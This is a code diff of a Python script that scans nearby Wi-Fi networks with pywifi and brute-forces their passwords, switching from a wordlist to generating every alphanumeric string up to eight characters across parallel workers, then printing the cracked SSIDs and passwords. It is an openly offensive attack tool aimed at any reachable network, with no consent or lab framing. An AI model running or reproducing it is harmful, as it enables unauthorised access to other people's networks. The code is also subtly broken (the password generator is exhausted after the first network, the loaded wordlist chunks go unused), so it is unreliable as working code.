@@ -1,31 +1,20 @@
 import time
 import pywifi
 from pywifi import const
+import itertools
 import multiprocessing
 import os
 
-available_devices = []
-keys = []
-final_output = {}
+# Function to generate passwords
+def generate_passwords(charset, password_length):
+    for length in range(1, password_length + 1):
+        for password in itertools.product(charset, repeat=length):
+            yield ''.join(password)
 
-# Get Wi-Fi interface information
-wifi = pywifi.PyWiFi()
-interface = wifi.interfaces()[0]
-
-# Scan for available networks
-interface.scan()
-time.sleep(5) 
-
-# Obtain scan results
-scan_results = interface.scan_results()
-
-# Extract SSIDs of available networks
-for result in scan_results:
-    available_devices.append(result.ssid)
-
-# Function to crack passwords
-def crack_passwords(networks, passwords):
+# Function to crack passwords using brute force
+def crack_passwords(networks, charset, password_length):
     final_output = {}
+    passwords = generate_passwords(charset, password_length)
     for network in networks:
         for password in passwords:
             profile = pywifi.Profile()
@@ -47,51 +36,64 @@ def crack_passwords(networks, passwords):
                 break
     return final_output
 
-# Print the current working directory
-print("Current Directory:", os.getcwd())
+if __name__ == '__main__':
+    # Define character set and password length
+    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    password_length = 8
 
-# Get the absolute path to the file
-file_path = os.path.join(os.path.dirname(__file__), 'top400.txt')
+    # Get Wi-Fi interface information
+    wifi = pywifi.PyWiFi()
+    interface = wifi.interfaces()[0]
 
-# Check if the file exists
-if os.path.exists(file_path):
-    print("File 'trypass.txt' found!")
-    # Read potential passwords from file
-    with open(file_path, 'r') as f:
-        for line in f:
-            keys.append(line.strip())
-else:
-    print("File 'trypass.txt' not found!")
+    # Scan for available networks
+    interface.scan()
+    time.sleep(5) 
 
+    # Obtain scan results
+    scan_results = interface.scan_results()
 
-# Read potential passwords from file
-with open('trypass.txt', 'r') as f:
-    for line in f:
-        keys.append(line.strip())
+    # Extract SSIDs of available networks
+    available_devices = [result.ssid for result in scan_results]
 
-# Divide the list of passwords into chunks for parallel processing
-chunk_size = len(keys) // multiprocessing.cpu_count()
-password_chunks = [keys[i:i+chunk_size] for i in range(0, len(keys), chunk_size)]
+    # Specify the directory containing 'trypass.txt'
+    directory = r"D:\Github clone repository's\Personal-Projects\Personal pj"
 
-# Create a process pool
-pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
+    # Combine the directory path with the file name
+    file_path = os.path.join(directory, 'trypass.txt')
 
-# Perform password cracking in parallel
-results = []
-for password_chunk in password_chunks:
-    results.append(pool.apply_async(crack_passwords, args=(available_devices, password_chunk)))
+    # Check if the file exists
+    if os.path.exists(file_path):
+        print("File 'trypass.txt' found!")
+        # Read potential passwords from file
+        with open(file_path, 'r') as f:
+            keys = [line.strip() for line in f]
+    else:
+        print("File 'trypass.txt' not found!")
+        keys = []
 
-# Collect results from the processes
-for result in results:
-    final_output.update(result.get())
+    # Divide the list of passwords into chunks for parallel processing
+    chunk_size = len(keys) // multiprocessing.cpu_count()
+    password_chunks = [keys[i:i+chunk_size] for i in range(0, len(keys), chunk_size)]
 
-# Close the pool
-pool.close()
-pool.join()
+    # Create a process pool
+    pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
 
-# Print the discovered passwords
-print('*'*10, 'Discovered Passwords', '*'*10)
-print("{0:<12} {1:<}".format("HOST NAME", "PASSWORD"))
-for ssid, password in final_output.items():
-    print("{:<12} {:<}".format(ssid, password))
+    # Perform password cracking in parallel
+    results = []
+    for password_chunk in password_chunks:
+        results.append(pool.apply_async(crack_passwords, args=(available_devices, charset, password_length)))
 
+    # Collect results from the processes
+    final_output = {}
+    for result in results:
+        final_output.update(result.get())
+
+    # Close the pool
+    pool.close()
+    pool.join()
+
+    # Print the discovered passwords
+    print('*'*10, 'Discovered Passwords', '*'*10)
+    print("{0:<12} {1:<}".format("HOST NAME", "PASSWORD"))
+    for ssid, password in final_output.items():
+        print("{:<12} {:<}".format(ssid, password))
